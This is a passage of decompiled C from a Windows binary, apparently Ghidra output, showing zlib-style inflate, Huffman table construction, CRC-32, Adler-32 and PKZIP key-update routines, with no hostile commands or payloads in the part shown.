              local_14 = local_c - 0xe;
            }
            local_18 = (byte *)((uint)(local_c == 0x12) * 8 + 3);
            local_10 = uVar11 + local_14;
            for (; uVar12 < local_10; uVar12 = uVar12 + 8) {
              if (local_20 == (byte *)0x0) goto LAB_00405f08;
              bVar10 = *_Src;
              local_20 = local_20 + -1;
              _Src = _Src + 1;
              param_1 = 0;
              uVar6 = uVar6 | (uint)bVar10 << ((byte)uVar12 & 0x1f);
              local_28 = uVar6;
            }
            uVar6 = uVar6 >> (bVar2 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_0041e160 + local_14 * 4) & uVar6);
            local_28 = uVar6 >> ((byte)local_14 & 0x1f);
            uVar12 = uVar12 - (local_14 + uVar11);
            iVar9 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar9) {
LAB_0040602b:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)s_invalid_bit_length_repeat_0041f37c;
              *(uint *)((int)this + 0x20) = local_28;
              *(uint *)((int)this + 0x1c) = uVar12;
              in_EAX[1] = local_20;
              in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
              *in_EAX = _Src;
              *(byte **)((int)this + 0x34) = pbVar3;
              FUN_00404ed0(-3);
              return;
            }
            if (local_c == 0x10) {
              if (iVar9 == 0) goto LAB_0040602b;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar9 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar9 * 4) = uVar7;
              iVar9 = iVar9 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar9;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_14 = 9;
      local_18 = (byte *)0x6;
      iVar9 = FUN_00406750((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                           (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,*(void **)((int)this + 0xc),
                           &local_14,(int *)&local_18,&local_8,&local_4,*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        param_1 = iVar9;
        goto LAB_004057e0;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1c);
      if (puVar8 == (undefined4 *)0x0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404ed0(-4);
        return;
      }
      *(undefined *)(puVar8 + 4) = (undefined)local_14;
      *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
      *puVar8 = 0;
      puVar8[5] = local_8;
      puVar8[6] = local_4;
      *(undefined4 **)((int)this + 4) = puVar8;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_00405804_caseD_405e04:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      pbVar4 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar4);
      *(byte **)((int)this + 0x34) = pbVar3;
      iVar9 = FUN_00405000(this,param_1);
      if (iVar9 != 1) {
        FUN_00404ed0(iVar9);
        return;
      }
      param_1 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      uVar5 = *(uint *)((int)this + 0x20);
      local_24 = *(byte **)((int)this + 0x34);
      local_20 = in_EAX[1];
      _Src = *in_EAX;
      uVar12 = *(uint *)((int)this + 0x1c);
      if (local_24 < *(byte **)((int)this + 0x30)) {
        local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_24);
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
      }
      local_28 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
switchD_00405804_caseD_4060fa:
        *(byte **)((int)this + 0x34) = local_24;
        param_1 = FUN_00404ed0(param_1);
        local_24 = *(byte **)((int)this + 0x34);
        if (*(byte **)((int)this + 0x30) == local_24) {
          *(undefined4 *)this = 8;
switchD_00405804_caseD_406137:
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
          *in_EAX = _Src;
          *(byte **)((int)this + 0x34) = local_24;
          FUN_00404ed0(1);
          return;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        goto LAB_004057e0;
      }
      *(undefined4 *)this = 0;
      break;
    case (undefined *)0x405bb4:
      goto switchD_00405804_caseD_405bb4;
    case (undefined *)0x405e04:
      goto switchD_00405804_caseD_405e04;
    case (undefined *)0x405f30:
switchD_00405804_caseD_405f30:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
      *in_EAX = _Src;
      *(byte **)((int)this + 0x34) = pbVar3;
      FUN_00404ed0(-3);
      return;
    case (undefined *)0x4060fa:
      goto switchD_00405804_caseD_4060fa;
    case (undefined *)0x406137:
      goto switchD_00405804_caseD_406137;
    }
                    // WARNING: Load size is inaccurate
    uVar11 = *this;
    pbVar3 = local_24;
    uVar6 = uVar5;
    uVar5 = local_28;
  } while( true );
LAB_00405f08:
  *(uint *)((int)this + 0x20) = local_28;
  *(uint *)((int)this + 0x1c) = uVar12;
  in_EAX[1] = (byte *)0x0;
  goto LAB_004057e0;
}



undefined4 FUN_004061b0(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



undefined4 __thiscall
FUN_00406240(void *this,uint param_1,uint param_2,int param_3,int param_4,int *param_5,int param_6,
            uint *param_7,uint *param_8)

{
  uint uVar1;
  undefined3 uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *in_EAX;
  int *piVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  undefined4 *puVar13;
  char cVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  byte bVar19;
  int iVar20;
  uint local_fc;
  uint *local_f8;
  uint local_f4;
  uint local_f0;
  uint *local_ec;
  uint local_e4;
  undefined4 local_dc;
  uint local_d8;
  int local_d4;
  int local_d0;
  int local_c8;
  uint local_c0 [16];
  uint local_80 [16];
  int aiStack_40 [16];
  
  local_c0[0] = 0;
  local_c0[1] = 0;
  local_c0[2] = 0;
  local_c0[3] = 0;
  local_c0[4] = 0;
  local_c0[5] = 0;
  local_c0[6] = 0;
  local_c0[7] = 0;
  local_c0[8] = 0;
  local_c0[9] = 0;
  local_c0[10] = 0;
  local_c0[11] = 0;
  local_c0[12] = 0;
  local_c0[13] = 0;
  local_c0[14] = 0;
  local_c0[15] = 0;
  piVar5 = (int *)this;
  uVar15 = param_1;
  do {
    local_c0[*piVar5] = local_c0[*piVar5] + 1;
    piVar5 = piVar5 + 1;
    uVar15 = uVar15 - 1;
  } while (uVar15 != 0);
  if (local_c0[0] == param_1) {
    *param_5 = 0;
    *in_EAX = 0;
  }
  else {
    local_f0 = 1;
    do {
      if (local_c0[local_f0] != 0) break;
      local_f0 = local_f0 + 1;
    } while (local_f0 < 0x10);
    local_fc = *in_EAX;
    if (*in_EAX < local_f0) {
      local_fc = local_f0;
    }
    uVar15 = 0xf;
    do {
      if (local_c0[uVar15] != 0) break;
      uVar15 = uVar15 - 1;
    } while (uVar15 != 0);
    if (uVar15 < local_fc) {
      local_fc = uVar15;
    }
    *in_EAX = local_fc;
    iVar20 = 1 << ((byte)local_f0 & 0x1f);
    for (uVar9 = local_f0; uVar9 < uVar15; uVar9 = uVar9 + 1) {
      if ((int)(iVar20 - local_c0[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar20 = (iVar20 - local_c0[uVar9]) * 2;
    }
    iVar20 = iVar20 - local_c0[uVar15];
    if (iVar20 < 0) {
      return 0xfffffffd;
    }
    local_c0[uVar15] = local_c0[uVar15] + iVar20;
    iVar10 = 0;
    iVar16 = uVar15 - 1;
    local_80[1] = 0;
    if (iVar16 != 0) {
      iVar18 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_c0 + iVar18 + 4);
        iVar16 = iVar16 + -1;
        *(int *)((int)local_80 + iVar18 + 8) = iVar10;
        iVar18 = iVar18 + 4;
      } while (iVar16 != 0);
    }
    uVar9 = 0;
    do {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      this = (void *)((int)this + 4);
      if (iVar10 != 0) {
        uVar8 = local_80[iVar10];
        param_8[uVar8] = uVar9;
        local_80[iVar10] = uVar8 + 1;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_1);
    uVar9 = local_80[uVar15];
    iVar16 = -1;
    iVar10 = -local_fc;
    local_e4 = 0;
    local_80[0] = 0;
    local_ec = param_8;
    aiStack_40[1] = 0;
    local_c8 = 0;
    local_f4 = 0;
    if ((int)local_f0 <= (int)uVar15) {
      local_d0 = local_f0 - 1;
      local_f8 = local_c0 + local_f0;
      do {
        uVar8 = *local_f8;
        uVar3 = local_dc;
        while (local_dc = uVar3, uVar8 != 0) {
          local_dc._2_2_ = (undefined2)((uint)uVar3 >> 0x10);
          uVar1 = uVar8 - 1;
          local_d4 = iVar10 + local_fc;
          if (local_d4 < (int)local_f0) {
            iVar11 = iVar10 - local_fc;
            iVar18 = iVar16;
            do {
              local_d4 = local_d4 + local_fc;
              iVar10 = iVar10 + local_fc;
              iVar16 = iVar18 + 1;
              iVar11 = iVar11 + local_fc;
              uVar17 = uVar15 - iVar10;
              if (local_fc < uVar15 - iVar10) {
                uVar17 = local_fc;
              }
              uVar12 = local_f0 - iVar10;
              uVar6 = 1 << ((byte)uVar12 & 0x1f);
              if ((uVar8 < uVar6) &&
                 (iVar7 = uVar6 + (-1 - uVar1), puVar4 = local_f8, uVar12 < uVar17)) {
                while (uVar12 = uVar12 + 1, uVar12 < uVar17) {
                  if ((uint)(iVar7 * 2) <= puVar4[1]) break;
                  iVar7 = iVar7 * 2 - puVar4[1];
                  puVar4 = puVar4 + 1;
                }
              }
              local_f4 = 1 << ((byte)uVar12 & 0x1f);
              uVar17 = local_f4 + *param_7;
              if (0x5a0 < uVar17) {
                return 0xfffffffd;
              }
              local_c8 = param_6 + *param_7 * 8;
              aiStack_40[iVar18 + 2] = local_c8;
              *param_7 = uVar17;
              if (iVar16 == 0) {
                *param_5 = local_c8;
              }
              else {
                local_80[iVar16] = local_e4;
                uVar17 = local_e4 >> ((byte)iVar11 & 0x1f);
                iVar18 = aiStack_40[iVar16];
                local_d8 = (local_c8 - iVar18 >> 3) - uVar17;
                *(undefined4 *)(iVar18 + uVar17 * 8) = local_dc;
                *(uint *)(iVar18 + 4 + uVar17 * 8) = local_d8;
              }
              iVar18 = iVar16;
            } while (local_d4 < (int)local_f0);
          }
          bVar19 = (byte)iVar10;
          uVar2 = CONCAT21(local_dc._2_2_,(char)local_f0 - bVar19);
          if (local_ec < param_8 + uVar9) {
            local_d8 = *local_ec;
            if (local_d8 < param_2) {
              cVar14 = (-(local_d8 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar18 = (local_d8 - param_2) * 4;
              local_d8 = *(uint *)(iVar18 + param_3);
              cVar14 = *(char *)(iVar18 + param_4) + 'P';
            }
            local_ec = local_ec + 1;
            local_dc = CONCAT31(uVar2,cVar14);
          }
          else {
            local_dc = CONCAT31(uVar2,0xc0);
          }
          iVar18 = 1 << ((char)local_f0 - bVar19 & 0x1f);
          uVar8 = local_e4 >> (bVar19 & 0x1f);
          if (uVar8 < local_f4) {
            puVar13 = (undefined4 *)(local_c8 + uVar8 * 8);
            do {
              *puVar13 = local_dc;
              puVar13[1] = local_d8;
              uVar8 = uVar8 + iVar18;
              puVar13 = puVar13 + iVar18 * 2;
            } while (uVar8 < local_f4);
          }
          uVar17 = 1 << ((byte)local_d0 & 0x1f);
          uVar8 = local_e4 & uVar17;
          while (uVar8 != 0) {
            local_e4 = local_e4 ^ uVar17;
            uVar17 = uVar17 >> 1;
            uVar8 = local_e4 & uVar17;
          }
          local_e4 = local_e4 ^ uVar17;
          uVar8 = uVar1;
          uVar3 = local_dc;
          if (((1 << (bVar19 & 0x1f)) - 1U & local_e4) != local_80[iVar16]) {
            do {
              iVar10 = iVar10 - local_fc;
              iVar16 = iVar16 + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & local_e4) != local_80[iVar16]);
          }
        }
        local_f8 = local_f8 + 1;
        local_d0 = local_d0 + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_f0 <= (int)uVar15);
    }
    if ((iVar20 != 0) && (uVar15 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_004066b0(void *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00406240(param_1,0x13,0x13,0,0,param_3,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = s_oversubscribed_dynamic_bit_lengt_0041f5f8;
  }
  else if ((iVar2 == -5) || (*param_2 == 0)) {
    *(char **)(unaff_EBX + 0x18) = s_incomplete_dynamic_bit_lengths_t_0041f444;
    iVar2 = -3;
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_00406750(uint param_1,uint param_2,void *param_3,int *param_4,int *param_5,int *param_6,
            int *param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00406240(param_3,param_1,0x101,0x41f3c8,0x41f468,param_6,param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_00406240((void *)((int)param_3 + param_1 * 4),param_2,0,0x41f508,0x41f580,param_7,
                           param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = s_oversubscribed_distance_tree_0041f640;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = s_incomplete_distance_tree_0041f660;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_00406884;
      }
      *(char **)(unaff_EBX + 0x18) = s_empty_distance_tree_with_lengths_0041f67c;
      iVar2 = -3;
LAB_00406884:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = s_oversubscribed_literal_length_tr_0041f4e4;
      goto LAB_004068b9;
    }
    if (iVar2 == -4) goto LAB_004068b9;
  }
  *(char **)(unaff_EBX + 0x18) = s_incomplete_literal_length_tree_0041f620;
  iVar2 = -3;
LAB_004068b9:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_004068d0(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  uint uVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar15 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar9 = *(uint *)(&DAT_0041e160 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0041e160 + param_2 * 4);
  local_c = pbVar11;
  do {
    for (; uVar4 < 0x14; uVar4 = uVar4 + 8) {
      bVar1 = *pbVar11;
      local_14 = local_14 + -1;
      pbVar11 = pbVar11 + 1;
      uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
      local_c = pbVar11;
    }
    bVar1 = *(byte *)(param_3 + (uVar9 & uVar15) * 8);
    uVar10 = (uint)bVar1;
    iVar7 = param_3 + (uVar9 & uVar15) * 8;
    uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
    if (uVar10 == 0) {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      *puVar16 = *(undefined *)(iVar7 + 4);
LAB_00406b1f:
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      while ((bVar1 & 0x10) == 0) {
        if ((uVar10 & 0x40) != 0) {
          if ((uVar10 & 0x20) != 0) {
            uVar9 = (int)param_6[1] - (int)local_14;
            if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
              uVar9 = uVar4 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
            param_6[1] = local_14 + uVar9;
            pbVar3 = *param_6;
            *param_6 = pbVar11 + -uVar9;
            param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)s_invalid_literal_length_code_0041f6b8;
          goto LAB_00406bed;
        }
        iVar5 = (*(uint *)(&DAT_0041e160 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
        bVar1 = *(byte *)(iVar7 + iVar5 * 8);
        uVar10 = (uint)bVar1;
        iVar7 = iVar7 + iVar5 * 8;
        uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
        if (uVar10 == 0) {
          uVar4 = uVar4 - *(byte *)(iVar7 + 1);
          *puVar16 = *(undefined *)(iVar7 + 4);
          goto LAB_00406b1f;
        }
        uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      }
      uVar10 = uVar10 & 0xf;
      uVar6 = (*(uint *)(&DAT_0041e160 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
      uVar15 = uVar15 >> (sbyte)uVar10;
      for (uVar4 = uVar4 - uVar10; uVar4 < 0xf; uVar4 = uVar4 + 8) {
        bVar1 = *pbVar11;
        local_14 = local_14 + -1;
        pbVar11 = pbVar11 + 1;
        uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
        local_c = pbVar11;
      }
      pbVar3 = (byte *)(param_4 + (uVar2 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
      uVar4 = uVar4 - pbVar3[1];
      bVar1 = *pbVar3;
      while ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          param_6[6] = (byte *)s_invalid_distance_code_0041f6a0;
LAB_00406bed:
          uVar9 = uVar4 >> 3;
          if ((uint)((int)param_6[1] - (int)local_14) <= uVar4 >> 3) {
            uVar9 = (int)param_6[1] - (int)local_14;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
          param_6[1] = local_14 + uVar9;
          pbVar3 = *param_6;
          *param_6 = pbVar11 + -uVar9;
          param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar7 = (*(uint *)(&DAT_0041e160 + (uint)bVar1 * 4) & uVar15) + *(int *)(pbVar3 + 4);
        pbVar12 = pbVar3 + iVar7 * 8;
        pbVar3 = pbVar3 + iVar7 * 8;
        uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
        uVar4 = uVar4 - pbVar3[1];
        bVar1 = *pbVar12;
      }
      uVar10 = bVar1 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
      for (; uVar4 < uVar10; uVar4 = uVar4 + 8) {
        local_14 = local_14 + -1;
        uVar15 = uVar15 | (uint)*pbVar12 << ((byte)uVar4 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_0041e160 + uVar10 * 4) & uVar15;
      uVar15 = uVar15 >> (sbyte)uVar10;
      puVar8 = puVar16 + -(uVar13 + *(int *)(pbVar3 + 4));
      puVar14 = *(undefined **)(param_5 + 0x28);
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar6;
      local_c = pbVar11;
      if (puVar8 < puVar14) {
        do {
          puVar8 = puVar8 + (*(int *)(param_5 + 0x2c) - (int)puVar14);
        } while (puVar8 < puVar14);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar8;
        if (uVar10 < uVar6) {
          iVar7 = uVar6 - uVar10;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar14 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
        else {
          *puVar16 = *puVar8;
          puVar16[1] = puVar8[1];
          puVar16 = puVar16 + 2;
          puVar8 = puVar8 + 2;
          iVar7 = uVar6 - 2;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
      }
      else {
        *puVar16 = *puVar8;
        puVar16[1] = puVar8[1];
        puVar16 = puVar16 + 2;
        puVar8 = puVar8 + 2;
        iVar7 = uVar6 - 2;
        do {
          *puVar16 = *puVar8;
          puVar16 = puVar16 + 1;
          puVar8 = puVar8 + 1;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
      uVar9 = (int)param_6[1] - (int)local_14;
      if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
        uVar9 = uVar4 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
      param_6[1] = local_14 + uVar9;
      pbVar3 = *param_6;
      *param_6 = pbVar11 + -uVar9;
      param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_00406c40(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 != (byte *)0x0) {
    uVar1 = ~in_EAX;
    if (7 < param_2) {
      uVar2 = param_2 >> 3;
      do {
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((*param_1 ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[1] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[2] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[3] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[4] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[5] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[6] ^ uVar1) & 0xff) * 4);
        uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((param_1[7] ^ uVar1) & 0xff) * 4);
        param_1 = param_1 + 8;
        param_2 = param_2 - 8;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    for (; param_2 != 0; param_2 = param_2 - 1) {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((*param_1 ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 1;
    }
    return ~uVar1;
  }
  return 0;
}



void __fastcall FUN_00406d50(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041f6f0 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_0041f6f0 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00406da0(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_0041f6f0 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_0041f6f0 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_00406e10(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
